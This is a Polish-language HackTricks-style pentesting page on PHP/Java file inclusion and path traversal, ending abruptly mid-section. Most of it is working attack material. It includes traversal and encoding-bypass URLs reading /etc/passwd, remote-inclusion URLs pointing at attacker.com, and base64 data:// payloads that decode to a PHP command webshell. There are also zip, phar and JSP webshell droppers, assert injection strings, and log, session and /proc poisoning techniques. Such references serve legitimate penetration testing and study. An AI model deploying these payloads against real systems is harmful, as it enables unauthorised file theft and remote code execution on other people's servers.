# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Plik jest ładowany z zdalnego serwera (najlepiej: możesz napisać code i serwer go wykona). W php jest to **wyłączone** domyślnie (**allow_url_include**).\
**Local File Inclusion (LFI):** Serwer ładuje lokalny plik.

Luka występuje, gdy użytkownik może w jakiś sposób kontrolować plik, który zostanie załadowany przez serwer.

Funkcje **PHP** podatne na tę lukę: require, require_once, include, include_once

Przydatne narzędzie do wykorzystania tej luki: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Łącząc kilka list *nix LFI i dodając więcej ścieżek, stworzyłem tę:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Spróbuj także zmienić `/` na `\`\
Spróbuj także dodać `../../../../../`

Lista wykorzystująca kilka technik do znalezienia pliku /etc/password (aby sprawdzić, czy podatność istnieje) znajduje się [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Połączenie różnych wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Spróbuj także zmienić `/` na `\`\
Spróbuj także usunąć `C:/` i dodać `../../../../../`

Lista wykorzystująca kilka technik do znalezienia pliku /boot.ini (aby sprawdzić, czy podatność istnieje) znajduje się [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Sprawdź listę LFI dla linux.

## Podstawowe LFI i obejścia

Wszystkie przykłady dotyczą Local File Inclusion, ale mogą być również zastosowane do Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences usunięte nierekurencyjnie
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass dodawania dodatkowych znaków na końcu przekazanego ciągu (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
To zostało **rozwiązane od PHP 5.4**

### **Kodowanie**

Możesz użyć niestandardowych kodowań, takich jak double URL encode (i inne):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Z istniejącego folderu

Może back-end sprawdza ścieżkę folderu:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Eksploracja katalogów systemu plików na serwerze

System plików serwera można przeszukiwać rekurencyjnie, aby zidentyfikować katalogi, a nie tylko pliki, stosując określone techniki. Proces ten obejmuje ustalenie głębokości katalogu oraz sprawdzanie istnienia konkretnych folderów. Poniżej znajduje się szczegółowa metoda, jak to osiągnąć:

1. **Ustal głębokość katalogu:** Określ głębokość bieżącego katalogu przez pomyślne pobranie pliku `/etc/passwd` (dotyczy serwerów opartych na Linux). Przykładowy URL może wyglądać następująco, wskazując głębokość równą trzem:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sprawdź foldery:** Dodaj nazwę podejrzanego folderu (np. `private`) do URL, a następnie przejdź z powrotem do `/etc/passwd`. Dodatkowy poziom katalogu wymaga zwiększenia głębokości o jeden:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Zinterpretuj wyniki:** Odpowiedź serwera wskazuje, czy folder istnieje:
- **Błąd / Brak wyjścia:** Folder `private` najprawdopodobniej nie istnieje w określonej lokalizacji.
- **Zawartość `/etc/passwd`:** Obecność folderu `private` zostaje potwierdzona.
4. **Rekurencyjne przeszukiwanie:** Odkryte foldery można dalej badać pod kątem podkatalogów lub plików, używając tej samej techniki lub tradycyjnych metod Local File Inclusion (LFI).

Do eksplorowania katalogów w innych lokalizacjach systemu plików dostosuj odpowiednio payload. Na przykład, aby sprawdzić, czy `/var/www/` zawiera katalog `private` (zakładając, że bieżący katalog jest na głębokości 3), użyj:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation to metoda używana do manipulowania ścieżkami plików w aplikacjach webowych. Często służy do uzyskania dostępu do plików objętych ograniczeniami poprzez obejście pewnych zabezpieczeń, które dopisują dodatkowe znaki na końcu ścieżek plików. Celem jest skonstruowanie ścieżki pliku, która po modyfikacji przez mechanizm zabezpieczający wciąż wskazuje na pożądany plik.

W PHP różne reprezentacje ścieżki pliku mogą być traktowane jako równoważne ze względu na sposób działania systemu plików. Na przykład:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` są wszystkie traktowane jako ta sama ścieżka.
- Jeśli ostatnie 6 znaków to `passwd`, dopisanie `/` (tworząc `passwd/`) nie zmienia pliku docelowego.
- Analogicznie, jeśli do ścieżki dopisane jest `.php` (np. `shellcode.php`), dodanie `/.` na końcu nie zmieni dostępu do pliku.

Poniższe przykłady pokazują, jak wykorzystać path truncation, aby uzyskać dostęp do `/etc/passwd`, częstego celu ze względu na jego wrażliwe treści (informacje o kontach użytkowników):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
W tych scenariuszach liczba wymaganych sekwencji ../ może wynosić około 2027, ale wartość ta może się różnić w zależności od konfiguracji serwera.

- **Using Dot Segments and Additional Characters**: Sekwencje (`../`) w połączeniu z dodatkowymi segmentami kropkowymi i znakami mogą być użyte do nawigacji w systemie plików, skutecznie ignorując przez serwer dołączone ciągi znaków.
- **Determining the Required Number of Traversals**: Metodą prób i błędów można znaleźć dokładną liczbę sekwencji `../` potrzebną, by przejść do katalogu root, a następnie do `/etc/passwd`, zapewniając, że wszelkie dołączone ciągi (np. `.php`) zostaną zneutralizowane, a pożądana ścieżka (`/etc/passwd`) pozostanie nienaruszona.
- **Starting with a Fake Directory**: Częstą praktyką jest zaczynanie ścieżki od nieistniejącego katalogu (np. `a/`). Technika ta służy jako środek ostrożności lub by spełnić wymagania logiki parsowania ścieżek na serwerze.

Stosując techniki obcinania ścieżek, kluczowe jest zrozumienie zachowania parsowania ścieżek przez serwer i struktury systemu plików. Każdy scenariusz może wymagać innego podejścia, a testy są często konieczne, aby znaleźć najbardziej skuteczną metodę.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

W php jest to domyślnie wyłączone, ponieważ **`allow_url_include`** jest **Off.** Musi być **On**, żeby to działało, i w takim przypadku możesz dołączyć plik PHP z serwera i uzyskać RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Jeśli z jakiegoś powodu **`allow_url_include`** jest **On**, ale PHP **filtruje** dostęp do zewnętrznych stron, [według tego posta](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), możesz na przykład użyć data protocol z base64, aby zdekodować b64 PHP code i uzyskać RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> W poprzednim kodzie końcowe `+.txt` zostało dodane, ponieważ atakujący potrzebował ciągu kończącego się na `.txt`, więc ciąg kończy się nim, a po dekodowaniu b64 ta część zwróci tylko śmieci, a prawdziwy kod PHP zostanie dołączony (i w związku z tym wykonany).

Inny przykład **nie używający protokołu `php://`** to:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python — element główny

W Pythonie, w kodzie takim jak ten:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Jeśli użytkownik poda **ścieżkę bezwzględną** do **`file_name`**, **poprzednia ścieżka jest po prostu usuwana**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To jest zamierzone zachowanie zgodnie z [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Jeżeli komponent jest ścieżką bezwzględną, wszystkie poprzednie komponenty są odrzucane, a łączenie kontynuuje się od komponentu będącego ścieżką bezwzględną.

## Listowanie katalogów w Java

Wygląda na to, że jeśli masz Path Traversal w Java i **ask for a directory** zamiast file, to zostanie zwrócony **listing of the directory is returned**. To nie będzie miało miejsca w innych językach (o ile mi wiadomo).

## Top 25 parametrów

Oto lista 25 parametrów, które mogą być podatne na local file inclusion (LFI) (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

Filtry PHP pozwalają wykonać podstawowe **operacje modyfikujące dane** przed ich odczytem lub zapisem. Istnieje 5 kategorii filtrów:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Usuwa tagi z danych (wszystko między znakami "<" i ">")
- Zauważ, że ten filtr zniknął w nowszych wersjach PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformuje do innego kodowania (`convert.iconv.<input_enc>.<output_enc>`). Aby uzyskać **listę wszystkich kodowań** obsługiwanych, uruchom w konsoli: `iconv -l`

> [!WARNING]
> Nadużywając filtra konwersji `convert.iconv.*`, można **wygenerować dowolny tekst**, co może być użyteczne do zapisania dowolnego tekstu lub sprawienia, że funkcja taka jak include przetworzy dowolny tekst. Po więcej informacji zobacz [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Kompresuje zawartość (przydatne przy eksfiltrowaniu dużej ilości informacji)
- `zlib.inflate`: Dekompresuje dane
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Przestarzałe
- `mdecrypt.*` : Przestarzałe
- Other Filters
- Uruchamiając w php `var_dump(stream_get_filters());` możesz znaleźć kilka **nieoczekiwanych filtrów**:
- `consumed`
- `dechunk`: odwraca HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Część "php://filter" nie rozróżnia wielkości liter

### Użycie php filters jako oracle do odczytu dowolnych plików

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) proponuje technikę odczytu lokalnego pliku bez zwracania jego zawartości przez serwer. Technika opiera się na **boolean exfiltration of the file (char by char) using php filters as oracle**. Dzieje się tak, ponieważ php filters mogą być użyte do powiększenia tekstu na tyle, by php rzucił wyjątek.

W oryginalnym poście znajdziesz szczegółowe wyjaśnienie techniki, ale tutaj krótkie podsumowanie:

- Użyj kodeka **`UCS-4LE`** aby umieścić wiodący znak tekstu na początku i sprawić, że rozmiar łańcucha będzie rosnąć wykładniczo.
- To posłuży do wygenerowania **tekstu tak dużego, że gdy wstępna litera zostanie odgadnięta poprawnie** php wywoła **błąd**.
- Filtr **dechunk** usunie wszystko **if the first char is not an hexadecimal**, więc możemy wiedzieć czy pierwszy char jest hex.
- To, w połączeniu z poprzednim (i innymi filtrami zależnymi od odgadniętej litery), pozwoli nam odgadnąć literę na początku tekstu obserwując, kiedy wykonamy wystarczająco dużo transformacji, by przestała być znakiem hex. Ponieważ jeśli jest hex, dechunk jej nie usunie, a początkowa bomba spowoduje błąd php.
- Kodek **convert.iconv.UNICODE.CP930** zamienia każdą literę na następną (czyli po tym kodeku: a -> b). Pozwala to odkryć, czy pierwsza litera to `a`, ponieważ jeśli zastosujemy ten kodek 6 razy: a->b->c->d->e->f->g, litera przestaje być znakiem hex, więc dechunk jej nie usuwa, a błąd php zostaje wywołany, bo mnoży się z początkową bombą.
- Używając innych transformacji jak **rot13** na początku, możliwe jest leak innych znaków jak n, o, p, q, r (i inne kodeki mogą być użyte do przesunięcia innych liter do zakresu hex).
- Gdy pierwszy char jest cyfrą, trzeba zakodować go w base64 i leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. Używając filtrów zmieniających kolejność pamięci takich jak **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** można zmienić kolejność znaków i umieścić na pierwszej pozycji inne litery tekstu.
- A żeby móc uzyskać **further data** pomysł jest **generate 2 bytes of junk data at the beginning** z użyciem **convert.iconv.UTF16.UTF16**, zastosować **UCS-4LE** żeby to **pivot with the next 2 bytes**, i d**elete the data until the junk data** (to usunie pierwsze 2 bajty oryginalnego tekstu). Kontynuuj to aż dojdziesz do żądanego bitu do leak.

W poście udostępniono też narzędzie do automatyzacji: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ten wrapper pozwala na dostęp do file descriptors, które proces ma otwarte. Potencjalnie przydatny do exfiltrate zawartości otwartych plików:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Możesz też użyć **php://stdin, php://stdout and php://stderr** aby uzyskać dostęp do **file descriptors 0, 1 and 2** odpowiednio (nie jestem pewien, jak mogłoby to być użyteczne w ataku)

### zip:// i rar://

Prześlij plik Zip lub Rar z PHPShell w środku i uzyskaj do niego dostęp.\
Aby móc nadużyć protokołu rar, musi on być **specjalnie aktywowany**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Należy pamiętać, że ten protokół jest ograniczony przez konfiguracje php **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect musi być aktywowany. Możesz wykonać code za pomocą tego:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Określ swój payload w parametrach POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Plik `.phar` może być wykorzystany do wykonania kodu PHP, gdy aplikacja webowa używa funkcji takich jak `include` do ładowania plików. Poniższy fragment kodu PHP demonstruje stworzenie pliku `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Aby skompilować plik `.phar`, należy wykonać następujące polecenie:
```bash
php --define phar.readonly=0 create_path.php
```
Po uruchomieniu zostanie utworzony plik o nazwie `test.phar`, który potencjalnie może zostać wykorzystany do eksploatacji podatności Local File Inclusion (LFI).

W sytuacjach, gdy LFI jedynie odczytuje plik bez wykonywania zawartego w nim kodu PHP (np. za pomocą `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` lub `filesize()`), można spróbować wykorzystać podatność na deserializację. Ta podatność wiąże się z odczytem plików przy użyciu protokołu `phar`.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

It was possible to abuse **any arbitrary file read from PHP that supports php filters** to get a RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Bardzo krótkie podsumowanie: a **3 byte overflow** w heapie PHP został wykorzystany do **zmiany łańcucha wolnych chunków** o określonym rozmiarze, aby móc **zapisać cokolwiek pod dowolnym adresem**, dlatego dodano hook wywołujący **`system`**.\
Można było zaalokować chunki o określonych rozmiarach, wykorzystując dodatkowe php filters.

### More protocols

Check more possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Zapis w pamięci lub w pliku tymczasowym (nie jestem pewien, jak to może być użyteczne w ataku file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Dostęp do lokalnego systemu plików
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Dostęp do adresów URL przez HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Dostęp do adresów URL FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Strumienie kompresji
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Znajdowanie ścieżek pasujących do wzorca (nie zwraca niczego czytelnego, więc nie jest tu zbyt przydatny)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Strumienie audio (nieprzydatne do odczytu dowolnych plików)

## LFI via PHP's 'assert'

Ryzyko Local File Inclusion (LFI) w PHP jest szczególnie wysokie przy użyciu funkcji 'assert', która może wykonywać kod zawarty w stringach. Jest to szczególnie problematyczne, jeśli wejście zawierające sekwencje directory traversal, takie jak "..", jest sprawdzane, ale nieprawidłowo oczyszczane.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Chociaż ma to na celu powstrzymanie traversal, niezamierzenie tworzy wektor umożliwiający code injection. Aby wykorzystać to do odczytania zawartości pliku, attacker mógłby użyć:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Podobnie, do wykonywania dowolnych poleceń systemowych można użyć:
```plaintext
' and die(system("id")) or '
```
Ważne: **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ta technika jest istotna w przypadkach, gdy **kontrolujesz** **ścieżkę pliku** funkcji **PHP**, która będzie **dostępować do pliku**, ale nie zobaczysz zawartości pliku (np. proste wywołanie **`file()`**), ponieważ zawartość nie jest wyświetlana.

W [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wyjaśniono, jak blind path traversal może być wykorzystany przez PHP filter do **exfiltrate the content of a file via an error oracle**.

W skrócie, technika używa kodowania **"UCS-4LE"** aby uczynić zawartość pliku tak **dużą**, że **funkcja PHP otwierająca** plik wywoła **błąd**.

Następnie, aby leak pierwszego znaku, używany jest filtr **`dechunk`** wraz z innymi, takimi jak **base64** czy **rot13**, a na końcu filtry **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE** są używane do **place other chars at the beggining and leak them**.

Funkcje, które mogą być podatne: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Szczegóły techniczne znajdziesz we wspomnianym poście!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Gdy kod po stronie serwera, który przyjmuje/przesyła pliki, buduje ścieżkę docelową używając danych kontrolowanych przez użytkownika (np. nazwy pliku lub URL) bez canonicalising i walidacji, segmenty `..` oraz ścieżki absolutne mogą wydostać się z zamierzonego katalogu i spowodować arbitralne zapisanie pliku. Jeśli możesz umieścić payload w katalogu dostępnym z webu, zwykle uzyskujesz niezautoryzowane RCE poprzez upuszczenie webshell.

Typowy przebieg eksploatacji:
- Identify a write primitive w endpointzie lub background workerze, który akceptuje ścieżkę/nazwę pliku i zapisuje zawartość na dysku (np. message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Określ katalogi dostępne z webu. Przykłady:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Sporządź traversal path, który wydostanie się z zamierzonego katalogu przechowywania do webroot i dołącz zawartość webshell.
- Przejdź do upuszczonego payload i wykonaj polecenia.

Uwagi:
- Usługa podatna, która wykonuje zapis, może nasłuchiwać na porcie nie-HTTP (np. JMF XML listener na TCP 4004). Główny portal webowy (inny port) później posłuży Twemu payload.
- Na stosach Java te zapisy plików często są implementowane przez proste konkatenacje `File`/`Paths`. Brak canonicalisation/allow-listing to podstawowy błąd.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Środki hardeningowe, które eliminują tę klasę błędów:
- Normalizuj do ścieżki kanonicznej i wymuszaj, by była potomkiem katalogu bazowego znajdującego się na liście dozwolonych.
- Odrzucaj każdą ścieżkę zawierającą `..`, ścieżki absolutne lub litery dysków; preferuj generowane nazwy plików.
- Uruchamiaj proces zapisujący jako konto o niskich uprawnieniach i oddziel katalogi zapisu od katalogów serwowanych.

## Remote File Inclusion

Wyjaśniono wcześniej, [**follow this link**](#remote-file-inclusion).

### Przez plik logu Apache/Nginx

Jeśli serwer Apache lub Nginx jest **podatny na LFI** wewnątrz funkcji include możesz spróbować uzyskać dostęp do **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, umieścić w **user agent** lub w **GET parameter** php shella jak **`<?php system($_GET['c']); ?>`** i dołączyć ten plik

> [!WARNING]
> Zauważ, że **jeśli użyjesz double quotes** dla shell zamiast **simple quotes**, double quotes zostaną zmodyfikowane dla ciągu "_**quote;**_", **PHP rzuci błąd** i **nic więcej nie zostanie wykonane**.
>
> Upewnij się też, że **poprawnie zapisujesz payload** albo PHP wygeneruje błąd za każdym razem, gdy będzie próbował załadować plik logu i nie będziesz miał drugiej szansy.

To można też zrobić w innych logach, ale **uważaj,** kod w logach może być URL encoded i to może zniszczyć Shell. Nagłówek **authorisation "basic"** zawiera "user:password" w Base64 i jest on dekodowany w logach. PHPShell można wstawić do tego nagłówka.\
Inne możliwe ścieżki logów:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Przez e-mail

**Wyślij e-mail** do wewnętrznego konta (user@localhost) zawierający Twój PHP payload, np. `<?php echo system($_REQUEST["cmd"]); ?>` i spróbuj dołączyć mail użytkownika ze ścieżką taką jak **`/var/mail/<USERNAME>`** lub **`/var/spool/mail/<USERNAME>`**

### Przez /proc/\*/fd/\*

1. Wgraj wiele shells (na przykład: 100)
2. Dołącz [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gdzie $PID = PID procesu (może być brute forced) a $FD to deskryptor pliku (może być brute forced również)

### Przez /proc/self/environ

Podobnie jak w przypadku pliku logu — wyślij payload w User-Agent; zostanie on odzwierciedlony w pliku /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Jeśli możesz uploadować plik, po prostu wstrzyknij w niego shell payload (np.: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Aby plik pozostał czytelny, najlepiej wstrzyknąć do metadanych obrazów/doc/pdf

### Przez przesłanie pliku Zip

Prześlij plik ZIP zawierający skompresowany PHP shell i uzyskaj dostęp:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Przez PHP sessions

Sprawdź, czy strona używa PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
W PHP te sesje są przechowywane w plikach _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ustaw cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Użyj LFI, aby dołączyć plik sesji PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Przez ssh

Jeśli ssh jest aktywne, sprawdź, którego użytkownika używa (/proc/self/status & /etc/passwd) i spróbuj uzyskać dostęp do **\<HOME>/.ssh/id_rsa**

### **Przez** **vsftpd** _**logi**_

Logi serwera FTP vsftpd znajdują się w _**/var/log/vsftpd.log**_. W scenariuszu, gdy istnieje podatność Local File Inclusion (LFI) i możliwy jest dostęp do wystawionego serwera vsftpd, można rozważyć następujące kroki:

1. Wstrzyknij PHP payload do pola username podczas procesu logowania.
2. Po wstrzyknięciu użyj LFI, aby pobrać logi serwera z _**/var/log/vsftpd.log**_.

### Przez php base64 filter (using base64)

Jak pokazano w [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter po prostu ignoruje znaki niebędące base64. Możesz użyć tego, aby obejść sprawdzanie rozszerzenia pliku: jeśli dostarczysz base64, które kończy się na ".php", filtr zignoruje "." i dołączy "php" do base64. Oto przykładowy payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Przez php filters (no file needed)

